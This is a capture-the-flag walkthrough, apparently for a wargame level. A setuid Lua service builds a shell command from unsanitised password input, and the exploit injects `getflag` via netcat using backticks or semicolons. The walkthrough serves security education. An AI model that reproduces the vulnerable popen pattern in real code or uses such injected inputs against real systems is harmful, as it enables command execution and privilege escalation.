### Solution

1. **Check files in home directory:**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
	```

	The script is a **SUID Lua script** owned by `flag11`.

2. **Analyze the Lua code:**

	```lua
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	function hash(pass)
		prog = io.popen("echo "..pass.." | sha1sum", "r")
		data = prog:read("*all")
		prog:close()

		data = string.sub(data, 1, 40)
		return data
	end

	while 1 do
		local client = server:accept()
		client:send("Password: ")
		client:settimeout(60)
		local l, err = client:receive()
		if not err then
				print("trying " .. l)
				local h = hash(l)

				if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
						client:send("Erf nope..\n");
				else
						client:send("Gz you dumb*\n")
				end
		end
		client:close()
	end
	```

	The Lua script uses:

	```lua
	io.popen("echo "..pass.." | sha1sum", "r")
	```

	This allows **command injection** because it does **no input sanitization**.

3. **Exploit via Netcat.**

	Connect to the local service:

	```bash
	nc 127.0.0.1 5151
	```

	When prompted for password, inject a shell command using backticks or semicolons:

	```bash
	Password: `getflag` > /tmp/flag11
	```

	Or:

	```bash
	Password: foo; getflag > /tmp/flag11
	```

4. **Verify the flag:**

	```bash
	cat /tmp/flag11
	```

	Output:

	```
	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
	```

	You’ve successfully executed `getflag` with `flag11`’s privileges.
